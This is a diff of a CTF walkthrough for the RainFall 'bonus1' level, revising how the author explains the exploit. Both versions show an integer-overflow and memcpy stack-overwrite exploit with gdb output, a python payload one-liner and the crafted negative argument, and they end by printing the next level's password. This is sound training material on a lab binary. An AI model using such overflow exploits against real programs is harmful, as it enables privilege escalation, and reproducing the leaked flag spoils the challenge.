@@ -1,77 +1,67 @@
 ## BONUS 1
-
-Ressources:
-- [Disassembled code](disassembled_code.md)
-- [Source code](srcs/bonus1.c)
-
-To solve this level we will use a **Buffer Overflow** and a **Integer Overflow**
-
-*I won't explain the details of the program, because the source is pretty easy to understand what it does.*
-
-In this level we have to change a integer value on the stack `val`, firstly I gonna take a look on the position of this value in the memory.
-
-```shell
-bonus1@RainFall:~$ gdb -q bonus1
-Reading symbols from /home/user/bonus1/bonus1...(no debugging symbols found)...done.
-(gdb) b *0x080484a3
-Breakpoint 1 at 0x80484a3
-(gdb) r 9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-Starting program: /home/user/bonus1/bonus1 9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-
-Breakpoint 1, 0x080484a3 in main ()
-(gdb) x/32x $esp + 0x14
-0xbffff674:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbffff684:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbffff694:	0x41414141	0x080484b9	0x00000009	0x080484b0
-0xbffff6a4:	0x00000000	0x00000000	0xb7e454d3	0x00000003
-0xbffff6b4:	0xbffff744	0xbffff754	0xb7fdc858	0x00000000
-0xbffff6c4:	0xbffff71c	0xbffff754	0x00000000	0x0804821c
-0xbffff6d4:	0xb7fd0ff4	0x00000000	0x00000000	0x00000000
-0xbffff6e4:	0xb92fcf47	0x8e6b8b57	0x00000000	0x00000000
-```
-
-Perfect, as we can see the variable `val` is 44 bytes after the start of our buffer. So is we want to overwrite this value we have to copy 44 elements with `memcpy()`. Let's take a look on `memcpy()` call.
+---
+### Starting from now, you will find explanations in the disassembled file for each line in few upcoming levels. This will provide a better understanding of the payload and the solution.
+---
+After the previous level this level could be one of the easiest level of rainfall.
 
 ```c
-memcpy(str, av[2], val * 4);
+val = atoi(av[1]);
+if (val < 10) {
+    memcpy(str, av[2], val * 4);
+    if (val == 0x574f4c46) {
+        execl("/bin/sh", "sh", 0);
 ```
 
-The program forbids to set an input higher than 9. But we can see that `memcpy()` multiply this value by 4. As we now is we multiply a very big number or a very small number, we can overflow this number. Multiply the number by 4 is the same as bitshifting it by 2. So I will use this site to see what happens with a very small number *(INT_MIN)*
+Here is the main part to understand in this level. To execute `execl`, we need to set the value of `val` to `0x574f4c46`. However, there is a condition right after the `atoi` function call. It is quite easy to understand that we need to use `memcpy` to change the value of `val`.
 
-```
--2147483648 << 2 = 0
-<==>
--2147483637 << 2 = 44
+```asm
+val address:
+0x0804843d <+25>:	mov    %eax,0x3c(%esp)
+buffer address:
+0x08048464 <+64>:	lea    0x14(%esp),%eax
 ```
 
-Amazing, if we use this number we can copy 44 elements with `memcpy()` and overwrite `val` with our second string.
-We need to do a last more thing to solve this level, we need to find with which value the program compare `val`.
+As I expected, the value is stored after the buffer. Since `memcpy` doesn't have any limitations except for the values provided as parameters, we can potentially use this function to overwrite the value of `val` and set it to `0x574f4c46`.
+
+So we can right now write the second payload, this content must fill the buffer (who is 40 bytes long) than write the value expected by the program.
 
 ```shell
-(gdb) disas main
-Dump of assembler code for function main:
-   0x08048424 <+0>:	push   %ebp
-   [...]
-   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
-   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
-   0x08048480 <+92>:	jne    0x804849e <main+122>
-   [...]
-   0x080484a4 <+128>:	ret
-End of assembler dump.
+$ python -c "print('\x90' * 40 + '\x46\x4c\x4f\x57')" > /tmp/payload
 ```
 
-The program compare `val` with the value `0x574f4c46`.
+Now we can focus on how `memcpy` can overwrite the value. We need to copy a total of 40 bytes, but the `if` condition restricts `val` to be no greater than 10, and `memcpy` copies `val * 4` bytes.
 
----
+To overcome this limitation, I will harness the power of integer overflow by employing an **Integer Overflow Attack**. This entails providing a negative value as our first argument, which, when multiplied by 4, will result in a positive value greater than 40. We just to find this value and it's done.
 
-### Payload
+For that I will use the binary conversion of 44.
 
-`python -c 'print ("\x42" * 40 + "\x46\x4c\x4f\x57")' > /tmp/payload`
+`44 <==> 00000000 00000000 00000000 00101100`
 
-Perfect, we just have to inject the payload into the program.
+Perfect! Now we know that multiplying a value by 4 is equivalent to left-shifting the value by 2 bits. Therefore, I will perform a right shift by 2 bits on this number.
+
+`00000000 00000000 00000000 00001011`
+
+Perfect but I want this number to be negative so I will put two `1` at the beginning of the number.
+
+`11000000 00000000 00000000 00001011`
+
+Perfect I just have to convert this number to decimal and I will have the value I need to provide as the first argument.
+
+`11000000 00000000 00000000 00001011 <==> -1073741813`
+
+Now I can execute the executable with the rights arguments and get the flag.
 
 ```shell
-bonus1@RainFall:~$ ./bonus1 -2147483637 $(cat /tmp/payload)
+$ ./bonus1 -1073741813 $(cat /tmp/payload)
+$ whoami
+bonus2
 $ cat /home/user/bonus2/.pass
 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
 ```
+
+---
+
+*Source :*
+
+*https://www.binaryconvert.com/result_signed_int.html?hexadecimal=C000000B*
+
